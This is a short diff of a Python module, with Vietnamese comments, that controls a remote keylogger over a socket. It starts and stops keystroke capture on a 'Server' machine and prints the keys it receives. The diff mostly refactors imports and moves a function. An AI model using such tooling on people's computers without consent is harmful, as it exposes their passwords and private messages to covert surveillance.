@@ -1,23 +1,11 @@
 from pynput import keyboard
-from module_support import send_command, receive_response_utf8
+from CRUD import send_command, receive_response
 
 
 # Biến trạng thái keylogger
 keylogger_running = False
 keys_pressed = ""
 MAX_LINE_LENGTH = 50
-
-def bat_tat_key_logger(client_socket):
-    global keylogger_running
-    if not keylogger_running:
-        send_command(client_socket, "START_KEYLOGGER")
-        print("Bat dau bat phim nhan tu may Server...")
-        keylogger_running = True
-        
-        #Tu dong chay lai khi Client nhan esc
-        key_logger(client_socket)    
-        send_command(client_socket, "STOP_KEYLOGGER")               
-        keylogger_running = False
 
 def key_logger(client_socket):
     print("Bat dau bat phim nhan (Keylogger) tu may Server... (Nhan 'Esc' de stop Keylogger)")
@@ -28,13 +16,13 @@ def key_logger(client_socket):
         if key == keyboard.Key.esc:
             print("Dang dung Keylogger...")
             send_command(client_socket, "STOP_KEYLOGGER")            
-            return False  # Dừng listener
+            return False  
         
     with keyboard.Listener(on_press=on_press) as listener:
         try:
             while True:
                 # Nhận dữ liệu từ server                
-                decoded_data = receive_response_utf8(client_socket)                
+                decoded_data = receive_response(client_socket)                
 
                 # Kiểm tra nếu nhận ký tự Enter từ server
                 if decoded_data == ' Key.enter ':
@@ -57,6 +45,14 @@ def key_logger(client_socket):
 
         except Exception as e:
             print(f"Loi: nhan du lieu tu Server: {e}")
-
-
-
+            
+def bat_tat_key_logger(client_socket):
+    global keylogger_running
+    if not keylogger_running:
+        send_command(client_socket, "START_KEYLOGGER")
+        print("Bat dau bat phim nhan tu may Server")
+        keylogger_running = True        
+        key_logger(client_socket)
+    
+        send_command(client_socket, "STOP_KEYLOGGER")               
+        keylogger_running = False
